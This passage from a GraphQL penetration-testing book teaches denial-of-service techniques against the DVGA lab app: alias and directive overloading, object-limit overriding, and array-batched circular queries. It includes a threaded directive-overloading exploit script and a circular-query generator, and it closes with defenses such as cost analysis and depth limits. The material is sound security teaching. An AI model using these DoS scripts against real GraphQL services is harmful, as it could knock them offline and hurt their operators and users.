<h3 id="h2-502840c05-0008"><a class="XrefDestination" id="AbusingAliasesforDenialofService"/><span class="XrefDestination" id="xref-502840c05-017"/>Abusing Aliases for Denial of Service</h3>
<p class="BodyFirst">When performing a penetration test, you may run into queries that seem to take the server longer to process than others. If you identify such a query, you can hog system resources by calling the same query over and over again. If the server struggles to quickly return a response, flooding the server with the same query could result in system overload.</p>
<p>In DVGA, one specific query is slower than others: <code>systemUpdate</code>. This query is designed to simulate long-running commands, such as those that perform system updates. Unauthorized clients should never be allowed to perform queries that change system state, but nothing is impossible in real-life penetration testing scenarios! Let’s run the <code>systemUpdate</code> query in Altair to see how long this command takes to fully process. It takes no arguments, as shown here:</p>
<pre><code><b>query {</b>
<b>  systemUpdate</b>
<b>}</b></code></pre>
<p>Send this query to the server and observe the time it takes for the server to return a response (<a href="#figure5-5" id="figureanchor5-5">Figure 5-5</a>).</p>
<figure>
<img alt="" class="" src="image_fi/502840c05/f05005.png"/>
<figcaption><p><a id="figure5-5">Figure 5-5</a>: The <span class="LiteralInCaption"><code>systemUpdate</code></span> query response time</p></figcaption>
</figure>
<p>The <code>systemUpdate</code> took 50,361 milliseconds to complete. That’s around 50 seconds, a significant amount of time by today’s web standards. This is an example of a query that we might be able to leverage for DoS purposes.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">Note</span></h2>
<p>	In your lab, the response time to <code>systemUpdate</code> could be faster. DVGA randomizes its behavior when this query is used to simulate system load behavior.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Using GraphQL aliases, we can attempt to run <code>systemUpdate</code> a few times to see how the server behaves. <a href="#listing5-7" id="listinganchor5-7">Listing 5-7</a> shows how you can run <code>systemUpdate</code> more than once, using aliases.</p>
<pre><code><span epub:type="pagebreak" id="Page_118" title="118"/>query {
  one:systemUpdate
  two:systemUpdate
  three:systemUpdate
  four:systemUpdate
  five:systemUpdate
}</code></pre>
<p class="CodeListingCaption"><a id="listing5-7">Listing 5-7</a>: Aliasing the <code>systemUpdate</code> query</p>
<p>Running this query in Altair should take longer than normal to complete.</p>
<p>If you need to generate hundreds of queries, you can use a short Python script in the terminal to craft a query programmatically, as shown in <a href="#listing5-8" id="listinganchor5-8">Listing 5-8</a>.</p>
<pre><code># <b>python3 -c 'for i in range(0, 10): print("q"+str(i)+":"+"systemUpdate")'</b>

q0:systemUpdate
q1:systemUpdate
q2:systemUpdate</code></pre>
<p class="CodeListingCaption"><a id="listing5-8">Listing 5-8</a>: Generating aliases with Python</p>
<p>Remember: there are no limits to the number of aliases a client can provide by default, unless the application maintainer has implemented specific protections against these types of attacks or the web server has set HTTP body length limits. That means we could specify dozens of aliases and hog server resources in a single HTTP request.</p>
<p>Other interesting, non-DoS use cases exist for aliases when it comes to penetration testing, such as defeating authentication mechanisms. You’ll learn more about those in <span class="xref" itemid="xref_target_Chapter 7">Chapter 7</span>.</p>
<h3 id="h2-502840c05-0009"><a class="XrefDestination" id="ChainingAliasesandCircularQueries"/><span class="XrefDestination" id="xref-502840c05-018"/>Chaining Aliases and Circular Queries</h3>
<p class="BodyFirst">Since aliases are part of the GraphQL specification, any other vulnerability you identify can be combined with aliases. The query in <a href="#listing5-9" id="listinganchor5-9">Listing 5-9</a> shows how we can run a circular query with an alias.</p>
<pre><code>query {
  q1:pastes {
    owner {
      pastes {
        owner {
          name
        }
      }
    }
  }
  q2:pastes {
    owner {
      pastes {
        owner {
<span epub:type="pagebreak" id="Page_119" title="119"/>          name
        }
      }
    }
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing5-9">Listing 5-9</a>: Circular queries with aliases</p>
<p>This query is not recursive enough to cause any harm to a GraphQL server, but it illustrates the possibility of making more than one circular query in a single GraphQL document.</p>
<p>The disadvantage of aliases is that they allow aliasing only queries of the same root type. You can alias queries only with queries, or mutations only with mutations, but not queries and mutations together.</p>
<h2 id="h1-502840c05-0005"><a class="XrefDestination" id="DirectiveOverloading"/><span class="XrefDestination" id="xref-502840c05-019"/>Directive Overloading</h2>
<p class="BodyFirst"><span class="xref" itemid="xref_target_Chapter 3">Chapter 3</span> covered GraphQL directives, which are a way to decorate a field or object in GraphQL by using the at (<code>@</code>) symbol. While directives are part of the GraphQL specification, the specification does not discuss security controls that should be implemented for directives. In general, GraphQL implementations check whether the client repeats a query directive; if so, the server rejects the query. Typical checks on directives are the following:</p>
<ul class="disc">
<li><code>UniqueDirectivesPerLocation</code> ensures that unique directives are in each document location, such as a field.</li>
<li><code>UniqueDirectiveNames</code> ensures that directives have unique names if more than one is supplied in a location such as a field.</li>
</ul>
<p>However, nonexistent queries can be supplied many times. There are effectively no limits to the number of nonexistent directives a client can supply in most of the popular GraphQL implementations today.</p>
<p>Our research has shown that it’s possible to exhaust GraphQL servers’ query parsers by passing a large number of nonexistent directives in a single query. During our responsible disclosure process for this directive overloading vulnerability, we engaged with multiple GraphQL developers on the matter. Opinions on whether it’s the maintainers’ or consumers’ responsibility to address the flaw varied quite a bit. Companies that were part of the disclosure process and chose to address it did so by limiting the number of directives a server will accept or blocking the query based on its HTTP request body’s size.</p>
<h3 id="h2-502840c05-0010"><a class="XrefDestination" id="AbusingDirectivesforDenialofService"/><span class="XrefDestination" id="xref-502840c05-020"/>Abusing Directives for Denial of Service</h3>
<p class="BodyFirst">The directive overloading vulnerability is somewhat similar to field duplication in that it requires us to send many directives via several continuous requests. Despite requiring more computing power than a vulnerability like circular queries, we’ve found it to be effective at degrading the server’s performance.</p>
<p><span epub:type="pagebreak" id="Page_120" title="120"/>The attack is quite simple: stuff directives in multiple parts of a query and send it to the server, as shown in <a href="#listing5-10" id="listinganchor5-10">Listing 5-10</a>.</p>
<pre><code>query {
   pastes {
      title @aa@aa@aa@aa # add as many directives as possible
      content @aa@aa@aa@aa
   }
}</code></pre>
<p class="CodeListingCaption"><a id="listing5-10">Listing 5-10</a>: An example of directive overloading</p>
<p>The impact on the server can vary depending on its hardware specifications. We’ve seen different server behaviors when using this exploitation technique, such as GraphQL server crashes (due to database memory errors) or service performance degradation.</p>
<h3 id="h2-502840c05-0011"><a class="XrefDestination" id="TestingforDirectiveOverloading"/><span class="XrefDestination" id="xref-502840c05-021"/>Testing for Directive Overloading</h3>
<p class="BodyFirst">The exploit in the book’s GitHub repository at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/exploit_directive_overloading.py">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/exploit_directive_overloading.py</a> abuses this type of vulnerability and can be used against DVGA to perform a directive overloading attack.</p>
<p>At any point while running this script, you can halt its operation by pressing CTRL-C<b> </b>to send the <em>SIGINT</em> signal. Note that while the script is running, DVGA will likely be slow or unresponsive.</p>
<p>The following command runs the exploit from the command line:</p>
<pre><code># <b>python3 exploit_directive_overloading.py http://localhost:5013/graphql 30000</b></code></pre>
<p><a href="#listing5-11" id="listinganchor5-11">Listing 5-11</a> shows the main exploit code.</p>
<pre><code>URL = sys.argv[1]
FORCE_MULTIPLIER = int(sys.argv[2])

def start_attack():
  payload = '@dos' * FORCE_MULTIPLIER
  query = {'query': 'query  { __typename ' + payload + ' }'}
  try:
    r = requests.post(URL, json=query, verify=False)
    print('\t HTTP Response', r.text)
    print('\t HTTP Code: '  , str(r.status_code))
  except:
    pass

threads = []

while True:
  time.sleep(2)
  start = time.time()
  start_attack()
  print(f'Time request took: {time.time() - start}')

  for i in range(300):
<span epub:type="pagebreak" id="Page_121" title="121"/>    t = threading.Thread(target=start_attack)
    threads.append(t)
    t.start()

  for t in threads:
    t.join()</code></pre>
<p class="CodeListingCaption"><a id="listing5-11">Listing 5-11</a>: The exploit code to abuse the directive overloading vulnerability</p>
<p>The exploit takes two arguments from the command line, one to identify the target API and the other for the number of directives that will be stuffed into the query during exploitation. As part of the <code>start_attack</code> function, we multiply the <code>dos</code> directive by the number of directives provided. We then build the GraphQL query that will use the malicious payload and create 300 threads, each running the <code>start_attack</code> function in parallel. This keeps the server resources busy for as long as the exploit is running by using an infinite <code>while</code> loop.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">Note</span></h2>
<p>	The directive specified in the exploit doesn’t have to exist in GraphQL for it to work. You can specify any arbitrary text and prepend it with the <code>@</code> symbol.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h2 id="h1-502840c05-0006"><a class="XrefDestination" id="ObjectLimitOverriding"/><span class="XrefDestination" id="xref-502840c05-022"/>Object Limit Overriding</h2>
<p class="BodyFirst">GraphQL servers can implement limits on the amount of data they return to a client by default. This is especially important for fields that return arrays. For example, recall that, in DVGA, the <code>pastes</code> query returns an array of paste objects:</p>
<pre><code>type Query {
  pastes: [PasteObject]!
}</code></pre>
<p>The exclamation mark means that <code>pastes</code> is non-nullable, so the array must have zero or more items. Unless the query is explicitly limited, GraphQL will return all objects in response to a request for <code>pastes</code>. If the database has 10,000 objects, for example, GraphQL could return all 10,000.</p>
<p>A response containing 10,000 objects is a lot of data for the server (and client) to process. Servers could implement logic to limit the number of returned objects to a more restricted number, such as 100. For example, they might sort objects by their creation time and return only the most recent pastes. This filtering can happen at the database level, the GraphQL level, or both.</p>
<p>Some GraphQL applications may allow a client to override this server-side object limit by passing a special argument such as <code>limit</code>, as in this example. Go ahead and run this query in Altair:</p>
<pre><code>query {
   pastes(limit:100000, public: true) {
     content
   }
}</code></pre>
<p><span epub:type="pagebreak" id="Page_122" title="122"/>When executing this query, GraphQL could convert it to a SQL query behind the scenes, as shown here:</p>
<pre><code>SELECT content FROM pastes WHERE public = true LIMIT 100000</code></pre>
<p>On a small-scale database such as DVGA’s, this won’t do a whole lot of harm. However, on very large databases, controlling the number of rows a server returns could be powerful and may allow us to perform database-level DoS.</p>
<p>If introspection is enabled, GraphQL will auto-complete arguments as you type them, making it easy to discover those that the queries support. If introspection is disabled, try common keywords such as <code>limit</code>, <code>offset</code>, <code>first</code>, <code>after</code>, <code>last</code>, <code>max</code>, and <code>total</code>. These keywords are often associated with <em>API pagination</em>, a way to control the amount of data returned in HTTP responses. Pagination divides a large dataset into smaller parts, which allows the client to both request and receive data in chunks.</p>
<p>It’s worth testing how many objects the server allows a client to request. Having the ability to request an arbitrary number of records from the server could become another DoS vector in an application.</p>
<h2 id="h1-502840c05-0007"><a class="XrefDestination" id="Array-BasedQueryBatching"/><span class="XrefDestination" id="xref-502840c05-023"/>Array-Based Query Batching</h2>
<p class="BodyFirst">Now we’ll explore a feature that very conveniently allows us to scale the attacks you’ve learned about so far. <em>Query batching</em> is any method used to group multiple queries and send them to the GraphQL API in parallel. Aliases are one form of query batching.</p>
<p>While useful, aliases have a clear disadvantage, as they can batch only queries that are of the same operation root type. For instance, you can’t alias a mutation and a query together. The technique of <em>array-based batching</em> allows us to mix queries and mutations. However, arrays aren’t part of the specification and therefore may not be available to you during all penetration tests.</p>
<h3 id="h2-502840c05-0012"><a class="XrefDestination" id="UnderstandingHowArray-BasedQueryBatchingWorks"/><span class="XrefDestination" id="xref-502840c05-024"/>Understanding How Array-Based Query Batching Works</h3>
<p class="BodyFirst">Array-based query batching is a feature that allows a client to send multiple GraphQL queries of any root type in an array as part of a JSON payload. Imagine that we want to send a query more than once and receive the same response multiple times. Using array-based query batching, we can easily do this by essentially duplicating this query and adding the copies as elements to an array. Here is a pseudo-query example:</p>
<pre><code>[
  query {
   ipAddr
   title
   content
  }
  query {
   ipAddr
   title
<span epub:type="pagebreak" id="Page_123" title="123"/>   content
  }
]</code></pre>
<p>When GraphQL receives an array of queries from a client, it will process them sequentially and refrain from returning a response until the very last array element is processed and resolved. Once all queries are resolved, it will return a response containing an array of all query responses in a single HTTP response.</p>
<p>Your hacker senses might be kicking in at this very moment, because there is a clear risk here. It’s assumed that the client will send a reasonable number of queries in an array. But what happens if a client sends thousands of queries in a single array instead? Let’s find out. Spoiler: bad things will happen.</p>
<p>As with aliasing, identifying the abuse of array-based batch queries can be difficult, because all a security analyst will see in their logs is a single HTTP request. This may not immediately stand out as a malicious pattern. Thus, this technique could circumvent traditional rate-limiting controls, which may restrict clients to a certain number of requests per second (RPS) or requests per minute (RPM).</p>
<p>At the end of the chapter, we’ll discuss some potential mitigations for batched queries an application could implement.</p>
<h3 id="h2-502840c05-0013"><a class="XrefDestination" id="TestingforArray-BasedQueryBatching"/><span class="XrefDestination" id="xref-502840c05-025"/>Testing for Array-Based Query Batching</h3>
<p class="BodyFirst">GraphQL IDEs such as Altair, GraphQL Playground, and GraphiQL Explorer do not support array-based queries directly from the interface. So, to test whether array-based query batching is enabled on the DVGA, we’ll need to use an HTTP client such as cURL or a scripting language such as Python. We’ll show how to use both methods in our lab.</p>
<h4 id="h3-502840c05-0004"><a class="XrefDestination" id="UsingcURL"/><span class="XrefDestination" id="xref-502840c05-026"/>Using cURL</h4>
<p class="BodyFirst">The command in <a href="#listing5-12" id="listinganchor5-12">Listing 5-12</a> sends an array of queries using cURL.</p>
<pre><code># <b>curl http://localhost:5013/graphql -H "Content-Type: application/json"</b>
<b>-d '[{"query":"query {systemHealth}"},{"query":"query {systemHealth}"}]'</b>

[
  {"data":{"systemHealth":"System Load: 0.03  \n"}},
  {"data":{"systemHealth":"System Load: 0.03  \n"}}
]</code></pre>
<p class="CodeListingCaption"><a id="listing5-12">Listing 5-12</a>: Array-based batch queries using cURL</p>
<p>In this cURL command, we’re using the <code>-d</code> flag to send an array of GraphQL queries to the server. The array, which is defined using square brackets <code>[]</code>, surrounds two similar GraphQL queries. In each query, we’re using the <code>systemHealth</code> object. The GraphQL server returns two separate responses.</p>
<p>Sending an array containing two GraphQL queries will result in an equal number of query responses if the GraphQL server supports <span epub:type="pagebreak" id="Page_124" title="124"/>array-based query batching. You can tell that this is the case by the <code>data</code> JSON field we received in the response. When the <code>-d</code> flag is used, cURL uses the HTTP POST method under the hood.</p>
<h4 id="h3-502840c05-0005"><a class="XrefDestination" id="UsingPython"/><span class="XrefDestination" id="xref-502840c05-027"/>Using Python</h4>
<p class="BodyFirst">The same query can be performed using Python, as shown in <a href="#listing5-13" id="listinganchor5-13">Listing 5-13</a>.</p>
<pre><code>import requests

queries = [
  {"query":"query {systemHealth}"},
  {"query":"query {systemHealth}"}
]

r = requests.post('http://localhost:5013/graphql', json=queries)

print(r.json())</code></pre>
<p class="CodeListingCaption"><a id="listing5-13">Listing 5-13</a>: Array-based batch queries using Python</p>
<p>We declare a <code>queries</code> array containing our two <code>systemHealth</code> queries. We then send them in a batch to DVGA and print the response. This should return an array containing two elements, each of which is a response to a single query. You can find this code in the GitHub repository at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_batch_query.py">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_batch_query.py</a>.</p>
<p>Save the file to your desktop and run the following:</p>
<pre><code># <b>cd ~/Desktop</b>
# <b>python3 array_based_batch_query.py</b>

[
   {'data': {'systemHealth': 'System Load: 1.49\n'}},
   {'data': {'systemHealth': 'System Load: 1.49\n'}}
]</code></pre>
<p>GraphQL servers that don’t support array-based batching may throw HTML errors because they don’t implement logic to handle an array payload. Servers that do support arrays but have disabled them may return an error such as the following:</p>
<pre><code>{'errors': [{'message': 'Batch GraphQL requests are not enabled.'}]}</code></pre>
<p>Next, we’ll explore how to perform DoS attacks by combining circular queries and array-based query batching.</p>
<h3 id="h2-502840c05-0014"><a class="XrefDestination" id="ChainingCircularQueriesandArray-BasedQueryBatching"/><span class="XrefDestination" id="xref-502840c05-028"/>Chaining Circular Queries and Array-Based Query Batching</h3>
<p class="BodyFirst">Using circular queries with array-based batching can wreak havoc on a GraphQL server and potentially knock it out. Consider the circular query in <a href="#listing5-14" id="listinganchor5-14">Listing 5-14</a>.</p>
<pre><code><span epub:type="pagebreak" id="Page_125" title="125"/>query {
  pastes {      # level 1
    owner {     # level 2
      pastes {  # level 3
        owner { # level 4
          name  # level 5
        }
      }
    }
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing5-14">Listing 5-14</a>: A circular query</p>
<p>This recursive query has a depth level of five. On its own, it may not be enough to take down the target server, but we could modify it to make it much deeper. Each level creates an additional node that a server needs to process and resolve, consuming more server resources.</p>
<p>To experiment with circular queries, we’ve coded a custom exploit for your arsenal of hacking tools. This exploit can dynamically extend its circularity by letting you specify the number of circles that should be performed. The query is also capable of batching queries using arrays. The following code is a snippet from <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_circular_queries.py">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_circular_queries.py</a>:</p>
<pre><code>ARRAY_LENGTH = 5
FIELD_REPEAT = 10

query = {"query":"query {"}
field_1_name = 'pastes'
field_2_name = 'owner'

count = 0
for _ in range(FIELD_REPEAT):
    count += 1
    closing_braces = '} ' * FIELD_REPEAT * 2  + '}'
    payload = "{0} {{ {1} {{ ".format(field_1_name, field_2_name)
    query["query"] += payload

    if count == FIELD_REPEAT:
      query["query"] += '__typename' + closing_braces
<var>--snip--</var>
queries = []
for _ in range(ARRAY_LENGTH):
  queries.append(query)

r = requests.post('http://localhost:5013/graphql', json=queries)

print(r.json())</code></pre>
<p>This code builds on the query in <a href="#listing5-14">Listing 5-14</a> by dynamically generating a circular query and adding it to an array based on two main script inputs: <code>ARRAY_LENGTH</code> and <code>FIELD_REPEAT</code>. The <code>ARRAY_LENGTH</code> is the number of queries to <span epub:type="pagebreak" id="Page_126" title="126"/>be grouped together. A value of <code>5</code> means that the array will have five queries. <code>FIELD_REPEAT</code> indicates the number of times the script will append the circular fields (<code>pastes</code> and <code>owner</code>) into the query.</p>
<p>The script then uses a <code>for</code> loop to construct the query based on the value of <code>FIELD_REPEAT</code> and assigns it to the <code>query</code> variable. We initialize an empty array named <code>queries</code> and run another <code>for</code> loop to add the query we constructed into the <code>queries</code> array. To put it simply, we construct a circular query, add it to an array based on predefined values, and send it to the target.</p>
<p>We encourage you to run this script in the lab to see how it works! Download the script to your lab and set the executable (<code>+x</code>) permissions before running it:</p>
<pre><code># <b>python3 array_based_circular_queries.py</b>

Query: query {pastes { owner { <var>...</var> } } }
Query Repeated: 10 times
Query Depth: 21 levels
Array Length: 5 elements</code></pre>
<p>The script will output the query and some information about it, such as the number of times the fields were repeated, the depth level of the query, and the length of the array sent to the server. You can alter <code>FIELD_REPEAT</code> and <code>ARRAY_LENGTH</code> to see the change in impact on the server’s responsiveness by dynamically growing the query and array.</p>
<p>There are no magic numbers here; you will want to gradually increase the numbers of fields until the target server becomes noticeably slower. Based on our lab experiments, setting <code>FIELD_REPEAT</code> to at least <code>500</code> should result in DVGA crashing with a segmentation fault error. In that case, start it up again by following the lab setup guidelines in <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span>.</p>
<h3 id="h2-502840c05-0015"><a class="XrefDestination" id="DetectingQueryBatchingbyUsingBatchQL"/><span class="XrefDestination" id="xref-502840c05-029"/>Detecting Query Batching by Using BatchQL</h3>
<p class="BodyFirst">Certain GraphQL tools attempt to detect when batching is available on a target GraphQL server. For instance, BatchQL is a small Python utility that scans for GraphQL weaknesses. It is able to detect both alias-based batching and array-based batching by sending a preflight request and observing the errors returned by the server. The following code demonstrates the logic it uses to detect array-based batching:</p>
<pre><code>repeated_query_list = "query { assetnote: Query { hacktheplanet } }"
repeated_query_dict = [{"query": repeated_query_list}, {"query":  repeated_query_list}]
repeated_query_success = False
try:
  r = requests.post(args.endpoint, headers=header_dict,
      json=repeated_query_dict, proxies=proxies, verify=False)
  error_count = len(r.json())
  <var>--snip--</var>
  if error_count &gt; 1:
    print("Query JSON list based batching: GraphQL batching is possible...
          preflight request was successful.")</code></pre>
<p><span epub:type="pagebreak" id="Page_127" title="127"/>In this example, BatchQL creates a GraphQL query by using the field <code>hacktheplanet</code>. It then creates an array containing two copies of the query. BatchQL sends the array to a target server and counts the number of errors returned in the response. If the number of errors is greater than one, it means that the server processed both queries.</p>
<p>The reason it looks for the number of errors returned is that the query contains the <code>hacktheplanet</code> field, which will likely not exist on any real target. Therefore, GraphQL will return an error for each query it wasn’t able to process. BatchQL uses the same error-counting logic for its detection of alias-based batching.</p>
<p>Let’s now attempt to run BatchQL against DVGA and see the kind of output we get. Use the <code class="bold">-e</code> flag to specify the GraphQL endpoint:</p>
<pre><code># <b>cd BatchQL</b>
# <b>python3 batch.py -e http://localhost:5013/graphql</b>

CSRF GET based successful. Please confirm that this is a valid issue.
CSRF POST based successful. Please confirm that this is a valid issue.
Query name based batching: GraphQL batching is possible... preflight request was successful.
Query JSON list based batching: GraphQL batching is possible...preflight request was successful.</code></pre>
<p>BatchQL was able to detect that both array-based batching and alias-based batching are available.</p>
<h2 id="h1-502840c05-0008"><a class="XrefDestination" id="PerformingaDoSAuditwithGraphQLCop"/><span class="XrefDestination" id="xref-502840c05-030"/>Performing a DoS Audit with GraphQL Cop</h2>
<p class="BodyFirst"><em>GraphQL Cop</em> is a Python-based security auditing utility capable of finding DoS and information disclosure weaknesses in GraphQL applications. It can identify most DoS classes covered in this chapter. Let’s use this tool against DVGA to see what vulnerabilities we can quickly find without a lot of effort.</p>
<p>GraphQL Cop takes very few parameters to do its work. To perform an audit, run it using the following commands:</p>
<pre><code># <b>cd ~/graphql-cop</b>
# <b>python3 graphql-cop.py -t http://localhost:5013/graphql</b>

                    GraphQL Cop
           Security Auditor for GraphQL
             Dolev Farhi &amp; Nick Aleks

[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service)
[HIGH] Batch Queries - Batch queries allowed with 10+ simultaneous queries (Denial of Service)
[HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field
       (Denial of Service)
[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query
       (Denial of Service)</code></pre>
<p><span epub:type="pagebreak" id="Page_128" title="128"/>As you can see, we get output containing a description of each vulnerability and its predefined severity. The tool was able to identify four DoS vectors in DVGA. If you need to parse this information programmatically during a penetration test, you may need a more script-friendly output. To achieve this, use the <code>-o</code> <code>json</code> flag.</p>
<h2 id="h1-502840c05-0009"><a class="XrefDestination" id="Denial-of-ServiceDefensesinGraphQL"/><span class="XrefDestination" id="xref-502840c05-031"/>Denial-of-Service Defenses in GraphQL</h2>
<p class="BodyFirst">We’ve explored various techniques for performing DoS attacks against GraphQL targets. While most GraphQL implementations don’t include comprehensive DoS mitigations by default (with some exceptions), it’s possible to protect against the attacks we’ve discussed.</p>
<h3 id="h2-502840c05-0016"><a class="XrefDestination" id="QueryCostAnalysis"/><span class="XrefDestination" id="xref-502840c05-032"/>Query Cost Analysis</h3>
<p class="BodyFirst">Complex queries are costly for servers to process, especially when many of them are sent simultaneously. When performing a penetration test, you may run into a GraphQL server that implements a <em>cost analyzer</em>. This term refers to any system that assigns a numerical value to GraphQL fields based on how much they “cost” to process. Processing involves CPU, input/output (I/O), memory, and network resource consumption.</p>
<p>Query cost analysis can be achieved in multiple ways, such as by evaluating the query structure pre-execution using static analysis or by observing the query response after it’s fully resolved.</p>
<h4 id="h3-502840c05-0006"><a class="XrefDestination" id="StaticallyAssigningCosttotheQuery"/><span class="XrefDestination" id="xref-502840c05-033"/>Statically Assigning Cost to the Query</h4>
<p class="BodyFirst">The more common form of cost analysis is <em>static analysis</em>. For instance, consider the following query:</p>
<pre><code>query {
  pastes {
    title
    content
    userAgent
    ipAddr
    owner {
      name
    }
  }
}</code></pre>
<p>We’re using the <code>pastes</code> top-level field and specifying some fields, such as <code>title</code>, <code>content</code>, and <code>owner</code>.</p>
<p>With static analysis, you can assign the query a cost in different ways. One common way is using a dedicated schema directive to specify values per field or per object type. The following example schema illustrates how cost assignment can be achieved through the use of schema directives:</p>
<pre><code><span epub:type="pagebreak" id="Page_129" title="129"/>directive @cost(
  complexity: Int = 1
) on FIELD_DEFINITION | OBJECT

type PasteObject {
  title: String @cost(complexity: 1)
  content: String @cost(complexity: 1)
  userAgent: String @cost(complexity: 5)
  ipAddr: String @cost(complexity: 5)
}</code></pre>
<p>Here, a special <code>cost</code> directive accepts a <code>complexity</code> argument, and the <code>complexity</code> argument accepts an integer value. If no value is provided to the <code>complexity</code> argument, it defaults to <code>1</code>. In the schema, the fields in <code>PasteObject</code> have some cost values assigned to them based on how resource heavy they are to resolve. (Imagine a field that requires the server to perform upstream checks against multiple third-party services, as opposed to a field that can be resolved by reading directly from a local database.)</p>
<p>Based on this schema definition, we can add directives to our query as follows:</p>
<pre><code>query {
  pastes {
    title     # cost: 1
    content   # cost: 1
    userAgent # cost: 5
    ipAddr    # cost: 5
  }
}</code></pre>
<p>The total cost of this query is <code>12</code>. Knowing the total cost allows the GraphQL server to decide whether it should accept the query or reject it because it’s deemed too expensive.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">Note</span></h2>
<p>	Some GraphQL implementations automatically assign a field a value of <code>1</code> if no cost value is explicitly set.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Many static cost assignment libraries don’t persist the cost information to any database or cache. Therefore, in practice, each query is evaluated per query. To illustrate the dangers of failing to track cost usage, consider the diagram in <a href="#figure5-6" id="figureanchor5-6">Figure 5-6</a>.</p>
<figure>
<img alt="" class="" src="image_fi/502840c05/f05006.png"/>
<figcaption><p><a id="figure5-6">Figure 5-6</a>: The dangers of stateless cost analysis</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_130" title="130"/>Here, a GraphQL server has set the maximum cost allowed (<code>MAX_COST</code>) to <code>200</code>. In this example, queries that have a cost of 200 and below are accepted, which means that if a client is sending multiple parallel queries, all with a cost of 200, all will be accepted. This might introduce risks if the application’s backend is not able or ready to sustain parallel queries with such cost. Imagine an attacker using the maximum cost allowed to send thousands of requests; if the limit is too forgiving, this could choke an application.</p>
<h4 id="h3-502840c05-0007"><a class="XrefDestination" id="DynamicallyAssigningCosttotheServerResponse"/><span class="XrefDestination" id="xref-502840c05-034"/>Dynamically Assigning Cost to the Server Response</h4>
<p class="BodyFirst">Cost analysis can also be performed on the server response to a query after it is fully resolved. The server must first process the query in order to understand its cost. However, looking at the actual resolved query can provide a more accurate cost estimation than the static technique.</p>
<p>The advantage of this dynamic method over the static method is that dynamic cost assignment takes into account the response complexity as it is returned by the server. Think of a client requesting a single field that results in the server returning an array containing 1,000 elements. In this case, the response indicates a level of complexity that cannot be inferred by just looking at the query.</p>
<h4 id="h3-502840c05-0008"><a class="XrefDestination" id="UsingCredits-BasedRateLimiting"/><span class="XrefDestination" id="xref-502840c05-035"/>Using Credits-Based Rate Limiting</h4>
<p class="BodyFirst">GraphQL servers can be designed to keep track of the cost of queries made throughout a client session’s lifetime. Tracking this information allows servers to set hourly or daily quota limits, and reject queries after a certain limit is exceeded, as part of a credit-based system. For example, a server may set an hourly credit allowance (such as 1,000) per user session or per source IP address. If a query had a static cost of 200, a client could make only five of these queries per hour. To query again, they would have to wait until the credit allowance quota renews.</p>
<p>For this mechanism to work, however, the server must track and store a client’s API usage data in a database. Otherwise, query limits based on cost would have to be stateless, which is common in GraphQL APIs.</p>
<h4 id="h3-502840c05-0009"><a class="XrefDestination" id="DiscoveringaQuery’sCostinResponses"/><span class="XrefDestination" id="xref-502840c05-036"/>Discovering a Query’s Cost in Responses</h4>
<p class="BodyFirst">As you’ve learned, there are a few ways to implement cost-analysis controls in GraphQL APIs. In some implementations, you may see cost-related metadata in the response to a query. Consider the following GraphQL response example, which uses the <code>extensions</code> response field to provide cost-related information to the client:</p>
<pre><code>{
  "data": {
<var>--snip--</var>
  },
  "extensions": {
    "cost": {
      "credits_total": 1000,
<span epub:type="pagebreak" id="Page_131" title="131"/>      "credits_remaining": 990,
    }
  }
}</code></pre>
<p>The <code>extensions</code> field is used to return some metadata to the client. This metadata is often related to query tracing, query cost calculation, or other debugging information. In this example, <code>credits_total</code> is the total number of available credits, and <code>credits_remaining</code> is the current number of credits left.</p>
<p>You may be asking yourself why a GraphQL server would share this information with the client in the first place. Clients can use it to determine when queries may start getting throttled by the server and potentially fail. This helps clients build better error-handling logic.</p>
<p>Of course, the availability of cost information is also valuable to hackers. If we have a way to know when our queries will be accepted by the server (as in the case of hourly credits), we have a way to determine when to launch a new attack the next time credits become available to us, instead of repeatedly sending requests that will get blocked.</p>
<h3 id="h2-502840c05-0017"><a class="XrefDestination" id="QueryDepthLimits"/><span class="XrefDestination" id="xref-502840c05-037"/>Query Depth Limits</h3>
<p class="BodyFirst">Earlier in this chapter, we discussed circular queries and how recursive queries in GraphQL could starve a server for resources. To protect a GraphQL server from recursive queries, applications can set query depth limits. For example, setting a <code>max_depth</code> configuration to a value of <code>10</code> would allow up to only 10 levels of depth. Any query that exceeds the allowed depth would get rejected.</p>
<p>Some of the more mature GraphQL implementations support depth analysis out of the box or by leveraging external libraries written specifically for this purpose. Let’s take a look at how to implement query depth limits in graphql-ruby (Ruby) and Graphene (Python).</p>
<p>In graphql-ruby, it is possible to set a maximum depth limit within the <code>MySchema</code> class:</p>
<pre><code>class MySchema &lt; GraphQL::Schema
<var>  --snip--</var>
  <b>max_depth 10</b>
end</code></pre>
<p>In Graphene, a maximum depth limit can be set in the following way:</p>
<pre><code>schema = Schema(query=MyQuery)

validation_errors = validate(
    schema=schema.graphql_schema,
    document_ast=parse('THE QUERY'),
    rules=(
        <b>depth_limit_validator(</b>
<b>            max_depth=20</b>
<b>        ),</b>
    )
)</code></pre>
<p><span epub:type="pagebreak" id="Page_132" title="132"/>Depth is typically calculated per query. If an attacker sends multiple recursive queries simultaneously, this can still impact the server quite drastically.</p>
